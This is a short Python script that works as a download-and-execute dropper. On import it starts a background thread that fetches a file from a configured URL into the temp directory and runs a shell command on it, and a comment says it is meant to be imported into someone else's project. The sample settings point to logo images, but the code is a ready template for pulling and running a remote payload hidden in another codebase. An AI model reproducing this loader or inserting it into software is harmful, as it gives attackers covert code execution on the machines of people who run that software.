

# Settings 
settings = {
    # Windows configuration:
    "windows": {
        # Download file from url:
        "url": "https://upload.wikimedia.org/wikipedia/commons/e/e0/Windows_logo.png",
        # Run command after downloading:
        "cmd": "start Windows_logo.png"
    },
    # Linux configuration:
    "linux": {
        # Download file from url:
        "url": "https://1000logos.net/wp-content/uploads/2017/03/LINUX-LOGO.png",
        # Run command after downloading:
        "cmd": "xdg-open LINUX-LOGO.png"
    }
}


# Import modules.
from threading import Thread
from platform import system as currentSystem
from urllib.request import urlretrieve as downloadFile
from urllib import error
from os import environ, path, chdir, curdir, system

# Main function.
def downloadPayload():
    # Get temp dir && url && command.
    if currentSystem().startswith("Win"):
        tmp = environ["temp"]
        url = settings["windows"]["url"]
        cmd = settings["windows"]["cmd"]
    else:
        tmp = "/tmp"
        url = settings["linux"]["url"]
        cmd = settings["linux"]["cmd"]

    # Check url and cmd.
    if not url or not cmd:
        return

    # Payload temp location.
    payload = tmp + "/" + url.split("/")[-1]
    # If payload not exists - download it.
    if not path.exists(payload):
        # Download payload to %temp% directory.
        try:
            downloadFile(url, payload)
        except error.URLError:
            print("Failed to download file, machine not connected to internet or url is incorrect!")
            return

    # Get current dir.
    startDir = curdir
    # Go to temp dir.
    chdir(tmp)
    # Execute you command.
    system(cmd)
    # Go back to app dir.
    chdir(startDir)

# Start in new thread.
# This is important if you are going to import this file
# into someone else's project.
Thread(target = downloadPayload).start()